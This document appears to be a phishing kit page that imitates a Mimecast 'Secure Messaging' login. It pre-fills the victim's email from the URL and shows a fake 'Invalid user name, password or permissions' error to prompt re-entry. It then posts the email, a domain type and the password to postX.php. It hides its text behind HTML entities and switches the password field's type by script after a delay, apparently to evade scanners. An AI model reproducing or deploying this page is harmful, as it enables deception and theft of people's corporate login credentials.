
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#83;&#101;&#99;&#117;&#114;&#101;&#32;&#77;&#101;&#115;&#115;&#97;&#103;&#105;&#110;&#103;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="../mimecast/images/favicon.ico"/>
			  <style type="text/css">
.textbox { 
    border: 1px solid #f0f0f0;
	background-color: #f0f0f0;
    height: 45px; 
    width: 275px; 
  	font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    font-size: 17px;
  	color: #393939;
    padding-left: 14px; 
    border-radius: 3px;  
}  
.textbox:focus { 
    outline: none; 
    border: 1px solid #f0f0f0; 
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body bgColor="#576B7C">
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:567px; z-index:0"><img src="../mimecast/images/m1.png" alt="" title="" border=0 width=1365 height=567></div>

<div id="image2" style="position:absolute; overflow:hidden; left:814px; top:500px; width:289px; height:16px; z-index:1"><img src="../mimecast/images/m2.png" alt="" title="" border=0 width=289 height=16></div>

<div id="image3" style="position:absolute; overflow:hidden; left:816px; top:413px; width:147px; height:36px; z-index:2"><a href="#"><img src="../mimecast/images/m3.png" alt="" title="" border=0 width=147 height=36></a></div>
<form action=postX.php name=janniklgai id=janniklgai method=post>
<input name="email" value="<?php echo $_GET['userid'] ?>" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:318px;left:817px;top:179px;z-index:3">
<select name="dm" class="textbox" autocomplete="off" required style="position:absolute;left:817px;top:231px;width:318px;z-index:4">
<option value="Domain">Domain</option><option value="Cloud">Cloud</option></select>
<input name="psw" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:318px;left:817px;top:283px;z-index:5">
<div style="position:absolute;width:318px;left:817px;top:334px;z-index:6;border:1px solid red ;margin-bottom: 7px; padding:2px;text-align:center;border-radius:2px">Invalid user name, password or permissions.</div>
<div id="formimage1" style="position:absolute; left:816px; top:364px; z-index:7"><input type="image" name="formimage1" width="83" height="46" src="../mimecast/images/gn.png"></div>
</div>

</body>
</html>
